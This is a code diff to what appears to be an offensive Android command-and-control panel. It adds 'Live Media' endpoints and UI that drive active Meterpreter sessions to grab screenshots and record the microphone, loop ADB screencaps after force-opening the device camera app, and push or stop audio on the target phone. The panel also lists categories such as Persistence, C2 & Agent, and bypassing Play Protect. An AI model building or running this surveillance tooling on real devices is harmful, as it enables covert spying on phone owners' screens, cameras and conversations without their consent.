@@ -253,8 +253,11 @@ class _Handler(BaseHTTPRequestHandler):
         elif p == "/api/c2/status":            self._api_c2_status()
         elif p == "/api/media/screen":         self._api_screen_stream()
         elif p == "/api/media/screen/snap":    self._api_screen_snap()
+        elif p == "/api/media/screen/size":    self._api_screen_size()
+        elif p == "/api/media/screen/msf":     self._api_screen_msf()
         elif p == "/api/media/camera/snap":    self._api_camera_snap()
         elif p == "/api/media/camera/stream":  self._api_camera_stream()
+        elif p == "/api/media/camera/stream_adb": self._api_camera_stream_adb()
         elif p == "/api/media/camera/list":    self._api_camera_list()
         elif p == "/api/media/camera/stop":    self._api_camera_stop()
         elif p == "/api/media/mic/chunk":      self._api_mic_chunk()
@@ -281,7 +284,9 @@ class _Handler(BaseHTTPRequestHandler):
         elif p == "/api/settings":          self._api_settings(body)
         elif p == "/api/media/mic/start":   self._api_mic_start(body)
         elif p == "/api/media/mic/stop":    self._api_mic_stop()
+        elif p == "/api/media/mic/msf":     self._api_mic_msf(body)
         elif p == "/api/media/speaker":     self._api_speaker(body)
+        elif p == "/api/media/speaker/stop":self._api_speaker_stop(body)
         elif p == "/api/msf/start":         self._api_msf_start(body)
         elif p == "/api/msf/stop":          self._api_msf_stop()
         elif p == "/api/msf/send":          self._api_msf_send(body)
@@ -565,6 +570,105 @@ class _Handler(BaseHTTPRequestHandler):
                 _cam_relay = None
         self._json({"ok": True})
 
+    def _api_camera_stream_adb(self):
+        """ADB-native camera stream: force-open camera app then screencap loop."""
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        cam_id = (qs.get("id") or ["0"])[0]
+        prefix = (["-s", serial] if serial else [])
+        adb    = shutil.which("adb") or "adb"
+        ff     = shutil.which("ffmpeg")
+
+        # launch camera app on device
+        pkg = "com.android.camera2" if cam_id == "0" else "com.android.camera"
+        subprocess.run([adb] + prefix + ["shell",
+            f"am start -a android.media.action.STILL_IMAGE_CAMERA 2>/dev/null || "
+            f"am start -n {pkg}/.Camera 2>/dev/null || true"],
+            capture_output=True, timeout=5)
+        time.sleep(0.8)
+
+        self.send_response(200)
+        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=secvframe")
+        self.send_header("Cache-Control", "no-cache, no-store")
+        self.send_header("Connection", "close")
+        self._cors()
+        self.end_headers()
+
+        BOUNDARY = b"--secvframe\r\nContent-Type: image/png\r\n\r\n"
+        while True:
+            try:
+                r = subprocess.run(
+                    [adb] + prefix + ["exec-out", "screencap", "-p"],
+                    capture_output=True, timeout=4)
+                if r.returncode != 0 or not r.stdout:
+                    time.sleep(0.3); continue
+                self.wfile.write(BOUNDARY + r.stdout + b"\r\n")
+                self.wfile.flush()
+                time.sleep(0.15)
+            except (BrokenPipeError, ConnectionResetError):
+                break
+            except Exception:
+                time.sleep(0.3)
+
+    # ── MEDIA: Screen size + MSF screenshot ───────────────────────────────────
+
+    def _api_screen_size(self):
+        """Return physical display size via adb wm size."""
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        prefix = (["-s", serial] if serial else [])
+        adb    = shutil.which("adb") or "adb"
+        try:
+            out = subprocess.run(
+                [adb] + prefix + ["shell", "wm", "size"],
+                capture_output=True, text=True, timeout=5).stdout
+            import re
+            m = re.search(r"Physical size:\s*(\d+)x(\d+)", out)
+            if not m:
+                m = re.search(r"(\d+)x(\d+)", out)
+            if m:
+                w, h = int(m.group(1)), int(m.group(2))
+                self._json({"ok": True, "width": w, "height": h,
+                            "aspect": f"{w}/{h}"})
+                return
+        except Exception:
+            pass
+        self._json({"ok": False, "width": 1080, "height": 2400})
+
+    def _api_screen_msf(self):
+        """Take a screenshot via Meterpreter and return the PNG bytes."""
+        qs       = parse_qs(urlparse(self.path).query)
+        session  = (qs.get("session") or ["1"])[0]
+        work_dir = Path.home() / ".secv" / "android" / "msf_screens"
+        work_dir.mkdir(parents=True, exist_ok=True)
+        msfc = shutil.which("msfconsole")
+        if not msfc:
+            self._json({"ok": False, "error": "msfconsole not found"}); return
+        out_file = str(work_dir / f"screen_{int(time.time())}.png")
+        rc = (
+            f"sessions -i {session}\n"
+            f"screenshot -p {out_file}\n"
+            f"exit\n"
+        )
+        rc_file = str(work_dir / "snap.rc")
+        Path(rc_file).write_text(rc)
+        try:
+            subprocess.run(
+                [msfc, "-q", "-r", rc_file],
+                capture_output=True, timeout=20)
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)}); return
+        if Path(out_file).exists():
+            data = Path(out_file).read_bytes()
+            self.send_response(200)
+            self.send_header("Content-Type", "image/png")
+            self.send_header("Content-Length", str(len(data)))
+            self.send_header("Cache-Control", "no-cache")
+            self._cors(); self.end_headers()
+            self.wfile.write(data)
+        else:
+            self._json({"ok": False, "error": "screenshot not found — ensure session is active"})
+
     # ── MEDIA: Microphone ──────────────────────────────────────────────────────
 
     def _api_mic_start(self, body: dict):
@@ -641,6 +745,37 @@ class _Handler(BaseHTTPRequestHandler):
         except Exception as e:
             self._json({"ok": False, "error": str(e)})
 
+    def _api_mic_msf(self, body: dict):
+        """Trigger record_mic via active Meterpreter session and return WAV."""
+        session  = str(body.get("session", "1"))
+        duration = int(body.get("duration", 5))
+        work_dir = Path.home() / ".secv" / "android" / "media"
+        work_dir.mkdir(parents=True, exist_ok=True)
+        msfc = shutil.which("msfconsole")
+        if not msfc:
+            self._json({"ok": False, "error": "msfconsole not found"}); return
+        out_file = str(work_dir / f"mic_msf_{int(time.time())}.wav")
+        rc = (
+            f"sessions -i {session}\n"
+            f"record_mic -d {duration} -f {out_file}\n"
+            f"exit\n"
+        )
+        rc_file = str(work_dir / "mic.rc")
+        Path(rc_file).write_text(rc)
+        try:
+            subprocess.run([msfc, "-q", "-r", rc_file],
+                           capture_output=True, timeout=duration + 15)
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)}); return
+        if Path(out_file).exists():
+            with _mic_lock:
+                _mic_chunks.append((out_file, time.time()))
+                if len(_mic_chunks) > 30:
+                    _mic_chunks.pop(0)
+            self._json({"ok": True, "path": out_file})
+        else:
+            self._json({"ok": False, "error": "recording not saved — check MSF session"})
+
     # ── MEDIA: Speaker ─────────────────────────────────────────────────────────
 
     def _api_speaker(self, body: dict):
@@ -669,6 +804,21 @@ class _Handler(BaseHTTPRequestHandler):
              f"-d file://{dev_path} -t {mime}"],
             capture_output=True, timeout=5)
         self._json({"ok": True, "path": dev_path})
+
+    def _api_speaker_stop(self, body: dict):
+        """Stop audio playback on device."""
+        serial = body.get("device", "")
+        prefix = (["-s", serial] if serial else [])
+        adb    = shutil.which("adb") or "adb"
+        for pkg in ("com.android.music", "com.google.android.music",
+                    "com.spotify.music", "com.android.soundrecorder"):
+            subprocess.run([adb] + prefix + ["shell", f"am force-stop {pkg}"],
+                           capture_output=True, timeout=5)
+        # also stop via media button broadcast
+        subprocess.run([adb] + prefix + ["shell",
+            "input keyevent KEYCODE_MEDIA_STOP 2>/dev/null || true"],
+            capture_output=True, timeout=4)
+        self._json({"ok": True})
 
     # ── MSF Meterpreter console ────────────────────────────────────────────────
 
@@ -2531,13 +2681,19 @@ a{color:var(--blue);text-decoration:none;}
 #screen-wrap{
   position:relative;background:#000;display:flex;
   align-items:center;justify-content:center;min-height:200px;
+  transition:height 0.3s ease;
+}
+#screen-wrap.sized{
+  /* height set dynamically via JS using detected aspect ratio */
+  min-height:unset;
 }
 #screen-img{
-  max-width:100%;max-height:480px;object-fit:contain;display:none;
+  width:100%;height:100%;object-fit:contain;display:none;
+  position:absolute;top:0;left:0;
 }
 #screen-placeholder{
   color:var(--muted);font-size:0.65rem;letter-spacing:0.08em;
-  text-transform:uppercase;padding:40px;
+  text-transform:uppercase;padding:40px;text-align:center;
 }
 #screen-overlay{
   position:absolute;top:6px;right:6px;
@@ -3111,15 +3267,23 @@ a{color:var(--blue);text-decoration:none;}
         <div class="live-section-hdr">
           <div class="live-dot" id="screen-dot"></div>
           <div class="live-label">Screen Mirror</div>
-          <button class="live-btn go" onclick="startScreen()">▶ Start</button>
+          <select class="live-select" id="screen-source" style="width:88px;">
+            <option value="adb">ADB Live</option>
+            <option value="msf">MSF snap</option>
+          </select>
+          <input class="live-input" id="msf-session-inp" type="text" value="1" placeholder="session #" style="width:50px;display:none;" title="Meterpreter session ID">
+          <button class="live-btn go" id="screen-start-btn" onclick="startScreen()">▶ Start</button>
           <button class="live-btn active" onclick="stopScreen()" style="display:none" id="screen-stop-btn">■ Stop</button>
           <button class="live-btn" onclick="snapScreen()">⬡ Snap</button>
+          <button class="live-btn" onclick="detectScreenSize()" title="Detect device screen size">⟳ Size</button>
           <span id="screen-fps" style="font-size:0.58rem;color:var(--muted);margin-left:4px;letter-spacing:0.06em;"></span>
+          <span id="screen-dims" style="font-size:0.55rem;color:var(--grey3);margin-left:4px;letter-spacing:0.06em;"></span>
         </div>
         <div id="screen-wrap">
-          <div id="screen-placeholder">Screen mirror off — click Start to begin streaming</div>
+          <div id="screen-placeholder">Screen mirror off — click ⟳ Size to detect dimensions, then ▶ Start</div>
           <img id="screen-img" alt="screen" />
           <div id="screen-overlay">● LIVE</div>
+          <div id="screen-source-badge" style="position:absolute;bottom:6px;right:6px;font-size:0.5rem;letter-spacing:0.12em;color:var(--muted);text-transform:uppercase;display:none;background:rgba(0,0,0,0.6);padding:2px 7px;"></div>
         </div>
       </div>
 
@@ -3131,15 +3295,17 @@ a{color:var(--blue);text-decoration:none;}
             <div class="live-dot" id="cam-dot"></div>
             <div class="live-label">Camera</div>
             <select class="live-select" id="cam-id">
-              <option value="0">Camera 0 (back)</option>
-              <option value="1">Camera 1 (front)</option>
+              <option value="0">Back</option>
+              <option value="1">Front</option>
             </select>
             <button class="live-btn" onclick="camSnap()">⬡ Snap</button>
-            <button class="live-btn go" onclick="startCamStream()">▶ Stream</button>
-            <input class="live-input" id="cam-port" type="text" value="8880" placeholder="MSF port" style="width:56px;">
+            <button class="live-btn go" onclick="startCamAdb()" title="ADB screencap loop (no payload needed)">▶ ADB</button>
+            <button class="live-btn" onclick="startCamStream()" title="Requires: webcam_stream in MSF session">▶ MSF</button>
+            <input class="live-input" id="cam-port" type="text" value="8880" placeholder="port" style="width:46px;">
+            <button class="live-btn active" onclick="stopCam()" id="cam-stop-btn" style="display:none">■</button>
           </div>
           <div class="camera-wrap">
-            <div id="camera-placeholder">Camera off — use Meterpreter webcam_stream or Snap</div>
+            <div id="camera-placeholder">Camera off — ADB (no payload) or MSF (webcam_stream)</div>
             <img id="camera-img" alt="camera" />
           </div>
         </div>
@@ -3154,7 +3320,8 @@ a{color:var(--blue);text-decoration:none;}
           <div class="audio-row">
             <span class="audio-label">Mic</span>
             <div id="mic-visualizer"></div>
-            <button class="live-btn" id="mic-btn" onclick="toggleMic()">▶ Record</button>
+            <button class="live-btn" id="mic-btn" onclick="toggleMic()">▶ ADB</button>
+            <button class="live-btn" id="mic-msf-btn" onclick="msfMicRec()" title="record_mic via Meterpreter session">▶ MSF</button>
             <select class="live-select" id="mic-dur">
               <option value="3">3s</option>
               <option value="5" selected>5s</option>
@@ -3171,6 +3338,7 @@ a{color:var(--blue);text-decoration:none;}
             <label class="speaker-file" id="spk-label" for="spk-file">Choose audio file…</label>
             <input type="file" id="spk-file" accept="audio/*" style="display:none" onchange="speakerFileChosen(this)">
             <button class="live-btn go" onclick="pushSpeaker()">▶ Push</button>
+            <button class="live-btn active" onclick="stopSpeaker()" title="Stop playback on device">■ Stop</button>
           </div>
           <div style="padding:4px 14px 8px;">
             <div id="spk-status" style="font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;">No file selected</div>
@@ -3242,6 +3410,7 @@ const OPS_CATS = {
   "Persistence":           "persist",
   "C2 & Agent":            "c2",
   "Evasion & Customization":"evasion",
+  "Live Media":            "c2",
   "Automated Chains":      "auto",
 };
 
@@ -3469,6 +3638,53 @@ const OPS = {
      desc:"Launch C2 server in headless CLI mode — no browser required.",
      cli:"secv android c2_cli",
      fields:[]},
+  ],
+  "Live Media": [
+    {id:"screen_mirror", label:"screen mirror",
+     desc:"Live screen mirror: ADB mode streams H.264 via ffmpeg → MJPEG at up to 15fps. MSF mode polls Meterpreter screenshot every 3s. Auto-detects device resolution for correct aspect ratio.",
+     cli:"secv android screen_mirror --source adb --serial <serial>\nsecv android screen_mirror --source msf --session 1",
+     runLabel:"MIRROR",
+     fields:[
+       {n:"source",p:"adb",t:"select",opts:["adb","msf"],label:"Source"},
+       {n:"serial",p:"",t:"text",label:"Device serial (blank = first)"},
+       {n:"msf_session",p:"1",t:"text",label:"MSF session # (msf mode)"},
+     ]},
+    {id:"camera_snap", label:"camera snap",
+     desc:"Capture a single frame from device camera. Uses ADB intent to open camera app then screencap, or Meterpreter webcam_snap for payload sessions.",
+     cli:"secv android camera_snap --cam-id 0 --serial <serial>\nsecv android camera_snap --source msf --session 1 --cam-id 1",
+     runLabel:"SNAP",
+     fields:[
+       {n:"cam_id",p:"0",t:"select",opts:["0","1"],label:"Camera (0=back, 1=front)"},
+       {n:"source",p:"adb",t:"select",opts:["adb","msf"],label:"Source"},
+       {n:"serial",p:"",t:"text",label:"Device serial"},
+     ]},
+    {id:"camera_stream", label:"camera stream",
+     desc:"Live camera feed. ADB: screencap loop (no payload needed). MSF: proxies Meterpreter webcam_stream MJPEG on specified port.",
+     cli:"secv android camera_stream --source adb --cam-id 0\nsecv android camera_stream --source msf --port 8880",
+     runLabel:"STREAM",
+     fields:[
+       {n:"source",p:"adb",t:"select",opts:["adb","msf"],label:"Source"},
+       {n:"cam_id",p:"0",t:"select",opts:["0","1"],label:"Camera (adb mode)"},
+       {n:"msf_port",p:"8880",t:"text",label:"MSF MJPEG port (msf mode)"},
+     ]},
+    {id:"mic_record", label:"mic record",
+     desc:"Record device microphone. ADB: uses tinycap/toybox on-device in timed chunks. MSF: calls record_mic in active Meterpreter session. Output saved to ~/.secv/android/media/.",
+     cli:"secv android mic_record --source adb --duration 5 --serial <serial>\nsecv android mic_record --source msf --session 1 --duration 10",
+     runLabel:"RECORD",
+     fields:[
+       {n:"source",p:"adb",t:"select",opts:["adb","msf"],label:"Source"},
+       {n:"duration",p:"5",t:"text",label:"Duration (seconds)"},
+       {n:"serial",p:"",t:"text",label:"Device serial (adb mode)"},
+       {n:"msf_session",p:"1",t:"text",label:"MSF session # (msf mode)"},
+     ]},
+    {id:"speaker_push", label:"speaker push",
+     desc:"Push an audio file (mp3/wav/ogg) to the device storage and play it via the media intent. Stop playback remotely via the ■ Stop button or CLI.",
+     cli:"secv android speaker_push --file /path/to/audio.mp3 --serial <serial>\nsecv android speaker_push --stop --serial <serial>",
+     runLabel:"PUSH",
+     fields:[
+       {n:"audio_path",p:"",t:"text",label:"Audio file path (local)"},
+       {n:"serial",p:"",t:"text",label:"Device serial"},
+     ]},
   ],
   "Evasion & Customization": [
     {id:"bypass_play_protect", label:"bypass Play Protect",
@@ -3828,6 +4044,41 @@ function mkField(label) {
 // ── Run ───────────────────────────────────────────────────────────────────────
 function runOp() {
   if (!currentOp) return;
+
+  // Live Media ops — switch to Live tab and activate directly
+  const liveMediaOps = {
+    screen_mirror: () => {
+      const src = (document.getElementById('f_source')||{}).value || 'adb';
+      const ses = (document.getElementById('f_msf_session')||{}).value || '1';
+      document.getElementById('screen-source').value = src;
+      document.getElementById('msf-session-inp').value = ses;
+      document.getElementById('msf-session-inp').style.display = src === 'msf' ? '' : 'none';
+      switchTab('live'); startScreen();
+    },
+    camera_snap: () => {
+      const camId = (document.getElementById('f_cam_id')||{}).value || '0';
+      document.getElementById('cam-id').value = camId;
+      switchTab('live'); camSnap();
+    },
+    camera_stream: () => {
+      const src   = (document.getElementById('f_source')||{}).value || 'adb';
+      const camId = (document.getElementById('f_cam_id')||{}).value || '0';
+      const port  = (document.getElementById('f_msf_port')||{}).value || '8880';
+      document.getElementById('cam-id').value = camId;
+      document.getElementById('cam-port').value = port;
+      switchTab('live');
+      if (src === 'msf') startCamStream(); else startCamAdb();
+    },
+    mic_record: () => {
+      const src = (document.getElementById('f_source')||{}).value || 'adb';
+      const dur = (document.getElementById('f_duration')||{}).value || '5';
+      document.getElementById('mic-dur').value = dur;
+      switchTab('live');
+      if (src === 'msf') msfMicRec(); else startMicRecord();
+    },
+    speaker_push: () => { switchTab('live'); document.getElementById('spk-file').click(); },
+  };
+  if (liveMediaOps[currentOp.id]) { liveMediaOps[currentOp.id](); return; }
 
   const devTargetEl = document.getElementById('f_device_target');
   const devTarget   = devTargetEl ? devTargetEl.value : document.getElementById('dev-select').value;
@@ -6340,41 +6591,88 @@ let _speakerFile   = null;
 
 function onLiveTabOpen() {
   const serial = document.getElementById('dev-select').value;
-  // populate cam select from device map
   if (_deviceMap[serial]) {
     const cam = document.getElementById('cam-id');
-    // basic: ensure two options always present
-    if (cam.options.length < 2) {
-      cam.add(new Option('Camera 1 (front)', '1'));
-    }
+    if (cam.options.length < 2) cam.add(new Option('Front', '1'));
   }
+  // auto-detect screen size if not yet known
+  if (!_screenDims && serial) detectScreenSize();
   checkMsfStatus();
 }
 
 // ── Screen ────────────────────────────────────────────────────────────────────
+let _screenDims      = null;   // {width, height} after detectScreenSize()
+let _msfPollTimer    = null;
+
 function _screenSerial() {
   return document.getElementById('dev-select').value || '';
 }
 
+function detectScreenSize() {
+  const serial = _screenSerial();
+  const qs = serial ? '?serial=' + encodeURIComponent(serial) : '';
+  fetch('/api/media/screen/size' + qs).then(r => r.json()).then(d => {
+    if (d.ok) {
+      _screenDims = {width: d.width, height: d.height};
+      _applyScreenAspect(d.width, d.height);
+      document.getElementById('screen-dims').textContent = d.width + '×' + d.height;
+      showToast('Screen size detected: ' + d.width + '×' + d.height, 'connect', 2500);
+    } else {
+      showToast('Could not detect screen size — device connected?', 'disconnect', 3000);
+    }
+  });
+}
+
+function _applyScreenAspect(w, h) {
+  const wrap = document.getElementById('screen-wrap');
+  const maxH = Math.min(window.innerHeight * 0.72, 640);
+  const maxW = wrap.offsetWidth || 600;
+  let dispH = Math.round(maxW * h / w);
+  if (dispH > maxH) dispH = maxH;
+  wrap.style.height = dispH + 'px';
+  wrap.classList.add('sized');
+}
+
+function _screenSource() {
+  return document.getElementById('screen-source').value;
+}
+
+// Toggle MSF session input visibility based on source
+document.addEventListener('DOMContentLoaded', () => {
+  const sel = document.getElementById('screen-source');
+  if (sel) sel.addEventListener('change', () => {
+    const msf = document.getElementById('msf-session-inp');
+    if (msf) msf.style.display = sel.value === 'msf' ? '' : 'none';
+  });
+});
+
 function startScreen() {
   if (_screenActive) return;
+  const source = _screenSource();
+  if (source === 'msf') { startScreenMsf(); return; }
+
   _screenActive = true;
   _screenFpsCnt = 0;
+  _screenFpsTs  = Date.now();
   const serial  = _screenSerial();
   const img     = document.getElementById('screen-img');
   const ph      = document.getElementById('screen-placeholder');
   const dot     = document.getElementById('screen-dot');
   const stopBtn = document.getElementById('screen-stop-btn');
   const overlay = document.getElementById('screen-overlay');
+  const badge   = document.getElementById('screen-source-badge');
+  const startBtn= document.getElementById('screen-start-btn');
+
+  // Apply detected aspect ratio if known
+  if (_screenDims) _applyScreenAspect(_screenDims.width, _screenDims.height);
 
   img.src = '/api/media/screen' + (serial ? '?serial=' + encodeURIComponent(serial) : '');
   img.style.display = 'block'; ph.style.display = 'none';
   overlay.style.display = 'block';
+  badge.textContent = 'ADB'; badge.style.display = 'block';
   dot.classList.add('on');
-  stopBtn.style.display = '';
-  document.querySelector('#live-panel .live-section .live-btn.go').style.display = 'none';
+  stopBtn.style.display = ''; startBtn.style.display = 'none';
 
-  // FPS counter via load events
   img.onload = () => {
     _screenFpsCnt++;
     const now = Date.now();
@@ -6386,22 +6684,61 @@ function startScreen() {
   };
   img.onerror = () => {
     stopScreen();
-    showToast('Screen stream error — is device authorized?', 'disconnect', 4000);
+    showToast('Screen stream error — device authorized over ADB?', 'disconnect', 4000);
   };
   document.getElementById('live-badge').style.display = 'inline';
-  showToast('Screen mirror started', 'connect', 2000);
+  showToast('Screen mirror started (ADB)', 'connect', 2000);
+}
+
+function startScreenMsf() {
+  _screenActive = true;
+  const serial  = _screenSerial();
+  const session = document.getElementById('msf-session-inp').value || '1';
+  const img     = document.getElementById('screen-img');
+  const ph      = document.getElementById('screen-placeholder');
+  const dot     = document.getElementById('screen-dot');
+  const stopBtn = document.getElementById('screen-stop-btn');
+  const overlay = document.getElementById('screen-overlay');
+  const badge   = document.getElementById('screen-source-badge');
+  const startBtn= document.getElementById('screen-start-btn');
+
+  if (_screenDims) _applyScreenAspect(_screenDims.width, _screenDims.height);
+
+  dot.classList.add('on');
+  stopBtn.style.display = ''; startBtn.style.display = 'none';
+  overlay.style.display = 'block';
+  badge.textContent = 'MSF'; badge.style.display = 'block';
+  document.getElementById('live-badge').style.display = 'inline';
+  ph.style.display = 'none'; img.style.display = 'block';
+
+  function _msfSnap() {
+    if (!_screenActive) return;
+    const url = '/api/media/screen/msf?session=' + encodeURIComponent(session)
+              + (serial ? '&serial=' + encodeURIComponent(serial) : '')
+              + '&_t=' + Date.now();
+    img.src = url;
+  }
+  _msfSnap();
+  _msfPollTimer = setInterval(_msfSnap, 3000);
+  img.onerror = () => {
+    stopScreen();
+    showToast('MSF screenshot failed — is session ' + session + ' active?', 'disconnect', 5000);
+  };
+  showToast('Screen mirror started (MSF session ' + session + ', polling 3s)', 'connect', 3000);
 }
 
 function stopScreen() {
   _screenActive = false;
+  if (_msfPollTimer) { clearInterval(_msfPollTimer); _msfPollTimer = null; }
   const img     = document.getElementById('screen-img');
   img.src       = ''; img.style.display = 'none';
   document.getElementById('screen-placeholder').style.display = '';
   document.getElementById('screen-overlay').style.display     = 'none';
   document.getElementById('screen-dot').classList.remove('on');
   document.getElementById('screen-stop-btn').style.display    = 'none';
-  document.querySelector('#live-panel .live-section .live-btn.go').style.display = '';
+  document.getElementById('screen-start-btn').style.display   = '';
   document.getElementById('screen-fps').textContent           = '';
+  document.getElementById('screen-source-badge').style.display= 'none';
   document.getElementById('live-badge').style.display         = 'none';
 }
 
@@ -6414,6 +6751,12 @@ function snapScreen() {
 }
 
 // ── Camera ────────────────────────────────────────────────────────────────────
+function _camShowStream(img, ph) {
+  img.style.display = 'block'; ph.style.display = 'none';
+  document.getElementById('cam-dot').classList.add('on');
+  document.getElementById('cam-stop-btn').style.display = '';
+}
+
 function camSnap() {
   const serial = _screenSerial();
   const camId  = document.getElementById('cam-id').value;
@@ -6421,8 +6764,24 @@ function camSnap() {
   const img    = document.getElementById('camera-img');
   const ph     = document.getElementById('camera-placeholder');
   img.onload   = () => { img.style.display = 'block'; ph.style.display = 'none'; };
-  img.onerror  = () => showToast('Camera snap failed — try via Meterpreter webcam_snap', 'disconnect', 4000);
+  img.onerror  = () => showToast('Camera snap failed — try Meterpreter webcam_snap', 'disconnect', 4000);
   img.src      = url + '&_t=' + Date.now();
+}
+
+function startCamAdb() {
+  const serial = _screenSerial();
+  const camId  = document.getElementById('cam-id').value;
+  const img    = document.getElementById('camera-img');
+  const ph     = document.getElementById('camera-placeholder');
+  img.src = '/api/media/camera/stream_adb?serial=' + encodeURIComponent(serial) + '&id=' + camId + '&_t=' + Date.now();
+  _camShowStream(img, ph);
+  img.onerror = () => {
+    img.style.display = 'none'; ph.style.display = '';
+    document.getElementById('cam-dot').classList.remove('on');
+    document.getElementById('cam-stop-btn').style.display = 'none';
+    showToast('ADB camera stream failed — device connected?', 'disconnect', 4000);
+  };
+  showToast('Camera stream started (ADB screencap loop)', 'connect', 2500);
 }
 
 function startCamStream() {
@@ -6430,14 +6789,23 @@ function startCamStream() {
   const img  = document.getElementById('camera-img');
   const ph   = document.getElementById('camera-placeholder');
   img.src    = '/api/media/camera/stream?port=' + port + '&_t=' + Date.now();
-  img.style.display = 'block'; ph.style.display = 'none';
-  document.getElementById('cam-dot').classList.add('on');
+  _camShowStream(img, ph);
   img.onerror = () => {
     img.style.display = 'none'; ph.style.display = '';
     document.getElementById('cam-dot').classList.remove('on');
-    showToast('Camera stream failed — run webcam_stream in MSF first', 'disconnect', 5000);
+    document.getElementById('cam-stop-btn').style.display = 'none';
+    showToast('MSF camera stream failed — run webcam_stream in session first', 'disconnect', 5000);
   };
-  showToast('Camera stream started (proxied from port ' + port + ')', 'connect', 2500);
+  showToast('Camera stream started (MSF proxy port ' + port + ')', 'connect', 2500);
+}
+
+function stopCam() {
+  const img = document.getElementById('camera-img');
+  img.src = ''; img.style.display = 'none';
+  document.getElementById('camera-placeholder').style.display = '';
+  document.getElementById('cam-dot').classList.remove('on');
+  document.getElementById('cam-stop-btn').style.display = 'none';
+  fetch('/api/media/camera/stop', {method:'POST'});
 }
 
 // ── Microphone ────────────────────────────────────────────────────────────────
@@ -6453,7 +6821,7 @@ function startMicRecord() {
   const dur    = document.getElementById('mic-dur').value;
   btn.textContent = '■ Stop'; btn.classList.add('active');
   document.getElementById('audio-dot').classList.add('on');
-  document.getElementById('mic-status').textContent = 'Recording…';
+  document.getElementById('mic-status').textContent = 'Recording via ADB…';
   fetch('/api/media/mic/start', {
     method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify({device: serial, duration: parseInt(dur)})
@@ -6470,11 +6838,35 @@ function startMicRecord() {
 function stopMicRecord() {
   _micActive = false;
   clearInterval(_micPollTimer); _micPollTimer = null;
-  document.getElementById('mic-btn').textContent = '▶ Record';
+  document.getElementById('mic-btn').textContent = '▶ ADB';
   document.getElementById('mic-btn').classList.remove('active');
   document.getElementById('audio-dot').classList.remove('on');
   document.getElementById('mic-status').textContent = 'Stopped';
   fetch('/api/media/mic/stop', {method:'POST'});
+}
+
+function msfMicRec() {
+  const session = document.getElementById('msf-session-inp').value || '1';
+  const dur     = parseInt(document.getElementById('mic-dur').value) || 5;
+  const btn     = document.getElementById('mic-msf-btn');
+  btn.classList.add('active'); btn.textContent = '…';
+  document.getElementById('mic-status').textContent = 'MSF record_mic (' + dur + 's)…';
+  document.getElementById('audio-dot').classList.add('on');
+  fetch('/api/media/mic/msf', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({session, duration: dur})
+  }).then(r => r.json()).then(d => {
+    btn.classList.remove('active'); btn.textContent = '▶ MSF';
+    document.getElementById('audio-dot').classList.remove('on');
+    if (d.ok) {
+      pollMicChunk();
+      document.getElementById('mic-status').textContent = 'MSF recording saved';
+      showToast('MSF mic recording complete', 'connect', 2500);
+    } else {
+      document.getElementById('mic-status').textContent = 'MSF error: ' + (d.error||'');
+      showToast('MSF mic failed: ' + (d.error||''), 'disconnect', 4000);
+    }
+  });
 }
 
 function pollMicChunk() {
@@ -6488,7 +6880,6 @@ function pollMicChunk() {
     audio.src   = url; audio.style.display = 'block';
     const ts    = new Date().toLocaleTimeString();
     document.getElementById('mic-status').textContent = 'Last chunk: ' + ts;
-    // animate mic bars
     _animateMicBars();
   }).catch(()=>{});
 }
@@ -6537,6 +6928,17 @@ function pushSpeaker() {
       document.getElementById('spk-status').textContent = 'Error: ' + (d.error||'failed');
       showToast('Speaker push failed: ' + (d.error||''), 'disconnect', 4000);
     }
+  });
+}
+
+function stopSpeaker() {
+  const serial = _screenSerial();
+  fetch('/api/media/speaker/stop', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({device: serial})
+  }).then(r => r.json()).then(d => {
+    document.getElementById('spk-status').textContent = d.ok ? 'Stopped' : 'Stop failed';
+    if (d.ok) showToast('Audio stopped on device', 'connect', 2000);
   });
 }
 
